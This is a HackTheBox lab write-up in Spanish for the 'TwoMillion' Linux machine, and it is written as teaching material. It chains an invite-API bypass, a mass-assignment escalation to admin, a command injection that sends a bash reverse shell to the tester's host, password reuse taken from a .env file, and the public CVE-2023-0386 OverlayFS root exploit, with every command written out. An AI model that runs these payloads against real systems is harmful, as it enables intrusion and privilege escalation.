---
title: "TwoMillion"
os: "Linux"
difficulty: "Easy"
date: "2026-07-07"
tags: ["api", "mass-assignment", "command-injection", "cve", "privesc"]
summary: "La API del sistema de invitaciones permite registrarse; un mass assignment promueve la cuenta a admin, un endpoint con inyección de comandos da shell, y la escalada a root usa el CVE-2023-0386 de OverlayFS."
platform: "HackTheBox"
icon: "/picture/writeups/twomillion-htb.webp"
---

- **Sistema operativo:** Linux — Ubuntu 22.04 (kernel 5.15.70)
- **IP objetivo:** `10.129.48.191`
- **Bandera de usuario:** `/home/admin/user.txt`
- **Bandera de root:** `/root/root.txt`

## Resumen

El JavaScript de la web destapa la API del antiguo sistema de invitaciones de HTB: una pista en ROT13 y un código en Base64 permiten registrarse; el índice de la propia API expone endpoints de administración y un mass assignment promueve la cuenta a admin; el endpoint admin que genera VPNs tiene inyección de comandos que da shell como www-data; el archivo .env filtra la contraseña de admin reutilizada en SSH, y la escalada a root aprovecha el CVE-2023-0386 de OverlayFS, señalado además por un correo del propio sistema.

## 1. Comprobación del objetivo

Confirmo que la máquina está viva y estimo el SO por el TTL antes de escanear.

```bash
ping -c 3 10.129.48.191
```

TTL 63: Linux (64 menos el salto de la VPN). Sigo con el reconocimiento orientado a servicios Linux.

## 2. Reconocimiento

Barrido completo de puertos primero, y detección de versiones solo sobre los abiertos después.

```bash
sudo nmap -p- --min-rate 2000 -T4 -Pn -n 10.129.48.191
sudo nmap -p 22,80 -sC -sV -Pn -n 10.129.48.191
```

Solo hay dos puertos: **22 SSH** (OpenSSH 8.9p1) y **80 HTTP** servido por **nginx**. El script de nmap avisa de que el 80 no sirve la página directamente sino que **redirige a `http://2million.htb/`**. Ese nombre de dominio es un virtual host: nginx sirve el contenido según la cabecera de host, así que sin resolver ese nombre no veré la web real. El SSH queda como destino probable de credenciales.

## 3. Resolución del virtual host

Añado el nombre al archivo de hosts para que apunte a la IP y así la web cargue correctamente, y luego extraigo los enlaces de la portada para mapearla.

```bash
echo "10.129.48.191 2million.htb" | sudo tee -a /etc/hosts
curl -s http://2million.htb/ | grep -Eio 'href="/[^"]*"' | sort -u
```

Aparecen `/`, `/invite` y `/login`: es el portal antiguo de Hack The Box, que se entraba con un código de invitación. La ruta `/invite` es el punto de partida evidente, porque generar ese código sin tenerlo es el primer obstáculo.

## 4. Bypass del sistema de invitación

La página de invitación depende de un JavaScript, que es donde suele estar la lógica del código. Lo descargo:

```bash
curl -s http://2million.htb/js/inviteapi.min.js
```

Viene ofuscado con la técnica de empaquetado `eval(function(p,a,c,k,e,d)...)`. Al desempaquetarlo (cualquier des-ofuscador de JavaScript packed sirve) aparecen dos funciones, `verifyInviteCode` y `makeInviteCode`, que llaman a `/api/v1/invite/verify` y a `/api/v1/invite/how/to/generate`. Es decir, hay una API que la interfaz no muestra. Consulto el endpoint que explica cómo generar el código:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
```

La respuesta trae un texto que parece aleatorio pero conserva la estructura de palabras y una etiqueta `"enctype":"ROT13"`: está cifrado en ROT13. Descifrándolo dice que hay que hacer un POST a `/api/v1/invite/generate`. Lo llamo, y el código que devuelve viene con `"format":"encoded"` y termina en `=`, señal de Base64, así que lo decodifico:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate
echo "WEdKNUEtMjlaQjgtTDlQSDQtMkU2M1k=" | base64 -d
```

Sale `XGJ5A-29ZB8-L9PH4-2E63Y`, un código de invitación válido. Con él ya puedo registrarme.

## 5. Registro y sesión

Registro un usuario con el código y luego inicio sesión guardando las cookies, porque las siguientes peticiones necesitan sesión autenticada. El login espera los datos como formulario, no como JSON.

```bash
curl -s -c cookies.txt -X POST http://2million.htb/api/v1/user/register \
  -d "code=XGJ5A-29ZB8-L9PH4-2E63Y" \
  -d "username=ynd" -d "email=ynd@ynd.htb" \
  -d "password=Passw0rd123!" -d "password_confirmation=Passw0rd123!"

curl -s -c cookies.txt -X POST http://2million.htb/api/v1/user/login \
  -d "email=ynd@ynd.htb" -d "password=Passw0rd123!"

curl -s -b cookies.txt http://2million.htb/api/v1/user/auth
```

La comprobación de `auth` confirma sesión iniciada como `ynd` con `is_admin` a 0. Soy usuario normal; el objetivo ahora es ver qué más ofrece la API.

## 6. Escalada dentro de la aplicación por mass assignment

Muchas APIs mal diseñadas exponen un índice con todas sus rutas. Lo pido ya autenticado:

```bash
curl -s -b cookies.txt http://2million.htb/api/v1 | python3 -m json.tool
```

El índice lista tres endpoints de administración que la interfaz no muestra: `GET /api/v1/admin/auth`, `POST /api/v1/admin/vpn/generate` y `PUT /api/v1/admin/settings/update`. Ese último, que actualiza los datos del usuario, es el candidato a un mass assignment: si acepta el campo `is_admin` sin comprobar autorización, puedo promoverme yo mismo. Lo pruebo, respetando que el endpoint exige el cuerpo en JSON (con formulario devuelve un error de tipo de contenido):

```bash
curl -s -b cookies.txt -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Content-Type: application/json" \
  -d '{"email":"ynd@ynd.htb","is_admin":1}'
```

Responde con `is_admin: 1`: la cuenta queda promovida a administrador sin ninguna comprobación. Ahora tengo acceso a los endpoints admin, incluido el de generación de VPN.

## 7. RCE por inyección de comandos

El endpoint `POST /api/v1/admin/vpn/generate` construye un archivo de configuración VPN a partir de un `username`. Ese tipo de función suele pasar el nombre a un comando del sistema, así que pruebo a inyectar un comando después de un separador. Para recibir la shell levanto primero un receptor; como la reverse shell inicial es incómoda, uso una tubería con nombre para poder escribirle órdenes. El detalle importante es el escape: dentro del JSON no puedo usar comillas dobles, así que construyo la carga con comillas simples y la envío como datos binarios para que curl no la altere.

```bash
mkfifo /tmp/htbfifo
( tail -f /tmp/htbfifo | nc -lvnp 4444 ) &

printf '%s' '{"username":"ynd; bash -c '"'"'bash -i >& /dev/tcp/10.10.14.102/4444 0>&1'"'"'"}' > payload.json
curl -s -b cookies.txt -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Content-Type: application/json" --data-binary @payload.json
```

El `username` se pasa sin sanitizar al sistema y el separador `;` ejecuta mi comando: recibo una shell como **www-data**. Ya tengo ejecución en la máquina, pero con un usuario de servicio sin privilegios.

## 8. Credenciales en el .env

Con la shell de www-data, la fuente de credenciales más fiable en una app web es su archivo de configuración. En proyectos con este stack, el `.env` de la raíz guarda el usuario y la contraseña de la base de datos:

```bash
echo "cat /var/www/html/.env" > /tmp/htbfifo
```

Devuelve `DB_USERNAME=admin` y `DB_PASSWORD=SuperDuperPass123`. Es una contraseña de base de datos, pero existe un usuario `admin` en el sistema, y esas contraseñas se reutilizan constantemente.

## 9. Acceso como admin

Pruebo la contraseña de la base de datos en SSH como admin, que es la reutilización habitual entre el usuario de servicio y un usuario con sesión propia:

```bash
sshpass -p 'SuperDuperPass123' ssh admin@10.129.48.191
cat ~/user.txt
```

Funciona: entro como admin y leo la bandera de usuario en /home/admin/user.txt. Ahora busco el camino a root.

> [FLAG:USER] Bandera de usuario capturada en `/home/admin/user.txt`.

## 10. Escalada a root con CVE-2023-0386 (OverlayFS)

Antes de buscar exploits a ciegas, reviso las pistas que deja el sistema. El correo local del usuario suele indicar el camino previsto:

```bash
cat /var/mail/admin
```

Es un correo de ch4p que pide parchear el sistema y menciona explícitamente una CVE reciente en **OverlayFS / FUSE**. Con el kernel 5.15.70 de esta máquina eso apunta al **CVE-2023-0386**, que permite copiar un binario dentro de un montaje OverlayFS conservando el bit SUID y el propietario root, para acabar ejecutándolo como root. Compilo el prueba de concepto en mi máquina y lo subo al objetivo:

```bash
uname -a
git clone https://github.com/xkaneiki/CVE-2023-0386.git
scp -r CVE-2023-0386 admin@10.129.48.191:/tmp/cve
```

En el target se compila y se lanza. El exploit necesita dos procesos simultáneos: uno mantiene el montaje FUSE y el otro dispara la explotación, así que el primero va en segundo plano:

```bash
cd /tmp/cve && make all
(./fuse ./ovlcap/lower ./gc &)
sleep 3
./exp
id
cat /root/root.txt
```

`exp` entrega una shell con `uid=0(root)`, con la que se lee la bandera final en /root/root.txt.

> [FLAG:ROOT] Bandera de root capturada en `/root/root.txt`.

## Resumen de la cadena

nmap descubre SSH y un nginx que redirige al virtual host 2million.htb, el portal antiguo de HTB. Su JavaScript ofuscado destapa la API de invitaciones; una pista en ROT13 lleva al endpoint de generación y el código devuelto en Base64 permite registrarse. El índice de la propia API expone endpoints de administración, y un PUT a settings/update con `is_admin` en JSON promueve la cuenta a admin por mass assignment. El endpoint admin de generación de VPN tiene inyección de comandos en el parámetro username, que da shell como www-data. El .env filtra la contraseña de admin, reutilizada en SSH para el acceso como usuario. Finalmente, un correo del sistema señala la vulnerabilidad de OverlayFS, y el CVE-2023-0386 concede root.
